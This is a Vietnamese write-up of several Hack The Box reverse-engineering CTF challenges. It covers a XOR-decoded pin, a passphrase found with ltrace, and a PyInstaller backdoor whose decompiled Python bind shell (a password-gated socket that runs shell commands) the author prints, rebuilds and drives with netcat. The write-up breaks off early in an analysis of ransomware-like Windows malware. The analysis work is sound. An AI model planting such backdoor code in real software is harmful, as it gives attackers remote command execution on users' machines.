![image](https://user-images.githubusercontent.com/62060867/116211699-491fe400-a76e-11eb-8c49-04e2f8022889.png)

# 1.Authenticator

[rev_authenticator.zip](https://github.com/Stirring16/CTF-Hack-The-Box-Cyber-Apocalypse-2021/files/6383206/rev_authenticator.zip)

![image](https://user-images.githubusercontent.com/62060867/116214062-8c7b5200-a770-11eb-8136-74d801a98d98.png)

* Thử thách này cho ta một file ELF-64bit
```
┌──(kali㉿kali)-[~/Desktop/ReverseHTB]
└─$ file authenticator 
authenticator: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=66286657ca5a06147189b419238b2971b11c72db, not stripped
                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/ReverseHTB]
└─$ chmod +x authenticator
                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/ReverseHTB]
└─$ ./authenticator       

Authentication System 👽

Please enter your credentials to continue.

Alien ID: 0106
Access Denied!
```

* Như đã thấy, chương trình này yêu cầu ta nhập input Alien ID, nếu ID sai chương trình sẽ xuất ra `Access Denied!`
* Mình dùng IDA pro để xem detail hơn về chương trình

 ![image](https://user-images.githubusercontent.com/62060867/116216365-bfbee080-a772-11eb-96c5-fa0c4a61b396.png)

* Nhìn vào hàm Main mình thấy ngay được `if ( !strcmp(&s, "11337\n")` nếu Alien ID khác 11337 thì chương trình in ra `Access Denied!`, ngược lại sẽ yêu cầu nhập Pin

```
┌──(kali㉿kali)-[~/Desktop/ReverseHTB]
└─$ ./authenticator

Authentication System 👽

Please enter your credentials to continue.

Alien ID: 11337
Pin: 123
Access Denied!
```
* Nhập Pin sai chương trình tiếp tục in ra `Access Denied`
* Tiếp tục mình xem tiếp hàm `checkpin`

![image](https://user-images.githubusercontent.com/62060867/116217790-21cc1580-a774-11eb-85ea-083c3fb44ce9.png)

```
if ( ((unsigned __int8)aAVhAG8j89gvPDv[i] ^ 9) != a1[i] )
```

![image](https://user-images.githubusercontent.com/62060867/116230993-81312200-a782-11eb-964d-50fa053b6999.png)

* Ta có thể thấy được chuỗi `}a:Vh|}a:g}8j=}89gV<p<}:dV8<Vg9}V<9V<:j|{:` XOR với 9 trên mỗi kí tự nếu bằng `a1[i]` thì nó sẽ return về  `OLL` và in ra dòng `Access Granted! Submit pin in the flag format: CHTB{fl4g_h3r3}`

```
──(kali㉿kali)-[~/Desktop/ReverseHTB]
└─$ python3                                                                                                      1 ⚙
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> flag = "}a:Vh|}a:g}8j=}89gV<p<}:dV8<Vg9}V<9V<:j|{:"
>>> xor = 0x9
>>> decode_flag = [chr(ord(x)^xor) for x in flag]
>>> "".join(decode_flag)
'th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3'
>>> 
zsh: suspended  python3
                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/ReverseHTB]
└─$ ./authenticator                                                                                        148 ⨯ 2 ⚙

Authentication System 👽                                                                                             
                                                                                                                     
Please enter your credentials to continue.                                                                           
                                                                                                                     
Alien ID: 11337                                                                                                      
Pin: th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3                                                                      
Access Granted! Submit pin in the flag format: CHTB{fl4g_h3r3}
```
> ## So we got the flag: CHTB{th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3}


# 2.Passphrase

[rev_passphrase.zip](https://github.com/Stirring16/CTF-Hack-The-Box-Cyber-Apocalypse-2021/files/6384038/rev_passphrase.zip)

![image](https://user-images.githubusercontent.com/62060867/116231700-6b702c80-a783-11eb-8c3a-4f4516dbd8de.png)

* Thử thách này tiếp tục cho ta một file ELF 64-bit
```
┌──(kali㉿kali)-[~/Desktop/ReverseHTB/Passphrase]
└─$ file passphrase   
passphrase: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=60f6b6064d2e34a2b6a24dda9feb943b0b8c360f, not stripped
                                                                                                                      
┌──(kali㉿kali)-[~/Desktop/ReverseHTB/Passphrase]
└─$ chmod +x passphrase    
                                                                                                                      
┌──(kali㉿kali)-[~/Desktop/ReverseHTB/Passphrase]
└─$ ./passphrase   

Halt! ⛔
You do not look familiar..
Tell me the secret passphrase: abc

Intruder alert! 🚨
                     
```

Chương trình yêu cầu ta nhập mật khẩu, sai mật khẩu sẽ ỉn ra `Intruder alert! 🚨`

![image](https://user-images.githubusercontent.com/62060867/116234209-7bd5d680-a786-11eb-830c-eac9d4ea4554.png)

* Mình thấy biến `&s1` được cmp với `s` nếu khớp thì chương trình sẽ in ra `Sorry for suspecting you, please transfer this important message to the chief: CHTB{%s}`
* Mình dùng `ltrace` để debug

```
┌──(kali㉿kali)-[~/Desktop/ReverseHTB/Passphrase]
└─$ ltrace ./passphrase                                                                                              4 ⚙
setbuf(0x7f95be3186a0, 0)                                                 = <void>
strlen("\nHalt! \342\233\224")                                            = 10
putchar(10, 0, 0x55d21b000bc8, 8
)                                         = 10
.......
strlen("\nYou do not look familiar..")                                    = 27
putchar(105, 0, 0x55d21b000bd3, 19i)                                       = 105
usleep(30000)                                                             = <void>
strlen("\nYou do not look familiar..")                                    = 27
putchar(97, 0, 0x55d21b000bd3, 19a)                                        = 97
usleep(30000)                                                             = <void>
strlen("\nYou do not look familiar..")                                    = 27
putchar(114, 0, 0x55d21b000bd3, 19r)                                       = 114
usleep(30000)                                                             = <void>
strlen("\nYou do not look familiar..")                                    = 27
putchar(46, 0, 0x55d21b000bd3, 19.)                                        = 46
usleep(30000)                                                             = <void>
strlen("\nYou do not look familiar..")                                    = 27
putchar(46, 0, 0x55d21b000bd3, 19.)                                        = 46
usleep(30000)                                                             = <void>
strlen("\nYou do not look familiar..")                                    = 27
sleep(1)                                                                  = 0
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(10, 0, 0x55d21b000bf0, 16
)                                        = 10
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(84, 0, 0x55d21b000bf0, 16T)                                        = 84
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(101, 0, 0x55d21b000bf0, 16e)                                       = 101
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(108, 0, 0x55d21b000bf0, 16l)                                       = 108
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(108, 0, 0x55d21b000bf0, 16l)                                       = 108
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(32, 0, 0x55d21b000bf0, 16 )                                        = 32
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(109, 0, 0x55d21b000bf0, 16m)                                       = 109
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(101, 0, 0x55d21b000bf0, 16e)                                       = 101
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(32, 0, 0x55d21b000bf0, 16 )                                        = 32
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(116, 0, 0x55d21b000bf0, 16t)                                       = 116
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(104, 0, 0x55d21b000bf0, 16h)                                       = 104
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(101, 0, 0x55d21b000bf0, 16e)                                       = 101
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(32, 0, 0x55d21b000bf0, 16 )                                        = 32
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(115, 0, 0x55d21b000bf0, 16s)                                       = 115
usleep(30000)                                                             = <void>
......
putchar(58, 0, 0x55d21b000bf0, 16:)                                        = 58
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
putchar(32, 0, 0x55d21b000bf0, 16 )                                        = 32
usleep(30000)                                                             = <void>
strlen("\nTell me the secret passphrase: "...)                            = 32
sleep(1)                                                                  = 0
fgets(123
"123\n", 40, 0x7f95be317980)                                        = 0x7ffd03351f80
strlen("123\n")                                                           = 4
strcmp("3xtr4t3rR3stR14L5_VS_hum4n5", "123")                              = 2
printf("\033[31m")                                                        = 5
strlen("\nIntruder alert! \360\237\232\250\n")                            = 22                                           
putchar(10, 0x7ffd0334f8e0, 0x55d21b000c17, 23                                                                           
)                           = 10                                                                                         
usleep(30000)                                                             = <void>                                       
strlen("\nIntruder alert! \360\237\232\250\n")                            = 22                                           
putchar(73, 0, 0x55d21b000c17, 23I)                                        = 73                                          
usleep(30000)                                                             = <void>                                       
strlen("\nIntruder alert! \360\237\232\250\n")                            = 22                                           
putchar(110, 0, 0x55d21b000c17, 23n)                                       = 110                                         
usleep(30000)                                                             = <void>                                       
strlen("\nIntruder alert! \360\237\232\250\n")                            = 22                                           
putchar(116, 0, 0x55d21b000c17, 23t)                                       = 116                                         
usleep(30000)                                                             = <void>                                       
strlen("\nIntruder alert! \360\237\232\250\n")                            = 22                                           
putchar(114, 0, 0x55d21b000c17, 23r)                                       = 114                                         
usleep(30000)                                                             = <void>                                       
....                         
```

* Khi mình nhập 123 chương trình so sánh với `3xtr4t3rR3stR14L5_VS_hum4n5` và in ra `Intruder alert!`
* Vậy chuỗi được so sánh có thể là passphrase

```
┌──(kali㉿kali)-[~/Desktop/ReverseHTB/Passphrase]
└─$ ./passphrase                                                                                                     4 ⚙

Halt! ⛔
You do not look familiar..
Tell me the secret passphrase: 3xtr4t3rR3stR14L5_VS_hum4n5
✔

Sorry for suspecting you, please transfer this important message to the chief: CHTB{3xtr4t3rR3stR14L5_VS_hum4n5} 
```
> # Yep, So we got the flag: CHTB{3xtr4t3rR3stR14L5_VS_hum4n5} 


# 3.Backdoor

[rev_backdoor.zip](https://github.com/Stirring16/CTF-Hack-The-Box-Cyber-Apocalypse-2021/files/6384496/rev_backdoor.zip)


![image](https://user-images.githubusercontent.com/62060867/116241287-eee34b00-a78e-11eb-9d18-674f5060c0ee.png)

* Thử thách này cũng cho ta một file ELF 64-bit

```
┌──(kali㉿kali)-[~/Desktop/ReverseHTB/backdoor]
└─$ file bd                                                                                                    100 ⨯ 1 ⚙
bd: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1da3a1d77c7109ce6444919f4a15e7e6c63d02fa, stripped
                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/ReverseHTB/backdoor]
└─$ chmod +x  bd                                                                                                     1 ⚙
                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/ReverseHTB/backdoor]
└─$ ./bd                                         
```

* Sau khi thử chạy file thì không có gì xảy ra
* Mình đã tìm kiếm thông tin của file này và phát hiện đây là chương trình này đang chạy python file `pyc`
* Mục tiêu là lấy được file `pyc`. Bắt đầu với `objcopy`

```
┌──(kali㉿kali)-[~/Desktop/ReverseHTB/backdoor]
└─$ objcopy --dump-section pydata=pydata.dump bd
                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/ReverseHTB/backdoor]
└─$ ls    
bd  pydata.dump
```
* Ta đã có được file dump extracted data, tiếp theo mình dùng [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor.git) để extract file dump này

```
┌──(kali㉿kali)-[~/Desktop/ReverseHTB/backdoor]
└─$ python pyinstxtractor/pyinstxtractor.py pydata.dump 
[+] Processing pydata.dump
[+] Pyinstaller version: 2.1+
[+] Python version: 38
[+] Length of package: 6994886 bytes
[+] Found 45 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: bd.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python38 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: pydata.dump

You can now use a python decompiler on the pyc files within the extracted directory
                                                                                                                         
```
* Vậy chúng ta đã có được file `bd.pyc`. Tiếp theo ta cần decompile file bd.pyc

```
┌──(kali㉿kali)-[~/Desktop/ReverseHTB/backdoor]
└─$ decompyle3 pydata.dump_extracted/bd.pyc   
# decompyle3 version 3.3.2
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.5 (default, Aug  2 2020, 15:09:07) 
# [GCC 10.2.0]
# Embedded file name: bd.py
import socket
from hashlib import md5
from subprocess import check_output
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 4433))
sock.listen(5)
while True:
    while True:
        client, addr = sock.accept()
        data = client.recv(32)
        if len(data) != 32:
            client.close()

		if data.decode() != md5(b's4v3_th3_w0rld').hexdigest():
			client.send(b'Invalid')
			client.close()
		else:
			size = client.recv(1)
			command = client.recv(int.from_bytes(size, 'little'))
			if not command.startswith(b'command:'):
				client.close()
			else:
				command = command.replace(b'command:', b'')
				output = check_output(command, shell=True)
				client.send(output)
				client.close()
```

* Mình dựng lại server like this:
```
import socket
from hashlib import md5
from subprocess import check_output
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 1234))
sock.listen(5)
while True:
    while True:
        client, addr = sock.accept()
        data = client.recv(32).decode().rstrip("\n")

        if(data != 's4v3_th3_w0rld'):
            client.sendall('Invalid')
            client.close()
        else:
            command = client.recv(1024)
            if not command.startswith(b'command:'):
                client.close()
            else:
                command = command.replace(b'command:', b'')
                output = check_output(command, shell=True)
                client.send(output)
                client.close()
```

* Ok, Netcat để check xem có flag không:  `s4v3_th3_w0rld` -> `command:ls`

```                                                      
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -vvv 0.0.0.0 1234                               
0.0.0.0: inverse host lookup failed: Unknown host
(UNKNOWN) [0.0.0.0] 1234 (?) open
s4v3_th3_w0rld
command:ls
bd
fixbd.py
flag.txt
pydata.dump
pydata.dump_extracted
pyinstxtractor
python-decompile3
 sent 26, rcvd 88
```

* Oh, file Flag.txt 
```                                                               
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -vvv 0.0.0.0 1234                                   
0.0.0.0: inverse host lookup failed: Unknown host
(UNKNOWN) [0.0.0.0] 1234 (?) open
s4v3_th3_w0rld
command:cat flag.txt
CHTB{b4ckd00r5_4r3_d4nG3r0u5}
Goodjob!!!
 sent 36, rcvd 41

```
> # So we got the flag: CHTB{b4ckd00r5_4r3_d4nG3r0u5}


* 
# 4.Alienware

[rev_alienware.zip](https://github.com/Stirring16/CTF-Hack-The-Box-Cyber-Apocalypse-2021/files/6386440/rev_alienware.zip)

![image](https://user-images.githubusercontent.com/62060867/116285123-071b9000-a7b8-11eb-81e1-89a150187b3f.png)

* Thử thách này cho ta một một file PE32+ và file encrypted 

```
┌──(kali㉿kali)-[~/Desktop/ReverseHTB/rev_alienware]
└─$ file *                     
Alienware.exe:          PE32+ executable (console) x86-64, for MS Windows
Confidential.pdf.alien: data

```

* Phân tích funtion `TlsCallBack_0()`

![image](https://user-images.githubusercontent.com/62060867/116287016-1996c900-a7ba-11eb-9fae-982be2e2b9a9.png)

* Nhìn vào mình thấy nó tải một resource, giải mã nó và lưu trữ trên đĩa dưới dạng `xuTaV.dll`, sau đó nó load với `LoadLibrary` và nhận địa chỉ để xuất funtions `encryptFiles`
